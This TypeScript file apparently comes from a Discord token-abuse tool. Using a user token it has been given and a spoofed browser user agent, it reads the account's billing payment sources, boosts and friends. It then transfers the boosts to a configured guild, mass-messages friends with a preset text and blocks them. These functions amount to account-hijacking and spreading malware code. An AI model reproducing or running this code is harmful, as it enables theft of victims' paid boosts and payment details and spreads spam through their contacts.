import fetch from 'node-fetch';
import { config } from './config.mts';
import { IBoost, IChannel, IFriend, IUser } from '../interfaces/IDiscord.mts';

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0';

export const getUserInformation = async (token: string): Promise<IUser> => {
  return (await (
    await fetch(`https://discord.com/api/users/@me`, {
      headers: {
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json()) as IUser;
};

export const getBillingInformation = async (token: string) => {
  return (await (
    await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
      headers: {
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json()) as any[];
};

export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
  return (await (
    await fetch(`https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots`, {
      headers: {
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json()) as IBoost[];
};

export const getAllFriends = async (token: string): Promise<IFriend[]> => {
  return (await (
    await fetch(`https://discord.com/api/users/@me/relationships`, {
      headers: {
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json()) as IFriend[];
};

export const createFriendChannel = async (token: string, friendId: string): Promise<IChannel> => {
  return (await (
    await fetch(`https://discord.com/api/v9/users/@me/channels`, {
      method: 'POST',
      body: JSON.stringify({
        recipients: [friendId],
      }),
      headers: {
        'Content-type': 'application/json; charset=UTF-8',
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json()) as IChannel;
};

export const addBoostToserver = async (token: string, discordBoosts: Array<string>) => {
  return await (
    await fetch(`https://discord.com/api/v9/guilds/${config.log.guild_id}/premium/subscriptions`, {
      method: 'PUT',
      body: JSON.stringify({
        user_premium_guild_subscription_slot_ids: discordBoosts,
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json();
};

export const sendMessage = async (token: string, channelId: string) => {
  return await (
    await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
      method: 'POST',
      body: JSON.stringify({
        content: config.auto_msg.message_text,
        nonce: '',
        tts: false,
      }),
      headers: {
        'Content-type': 'application/json; charset=UTF-8',
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json();
};

export const blockFriend = async (token: string, friendId: string) => {
  return await (
    await fetch(`https://discord.com/api/v9/users/@me/relationships/${friendId}`, {
      method: 'PUT',
      body: JSON.stringify({
        type: 2,
      }),
      headers: {
        'Content-type': 'application/json; charset=UTF-8',
        'User-Agent': USER_AGENT,
        Authorization: token,
      },
    })
  ).json();
};
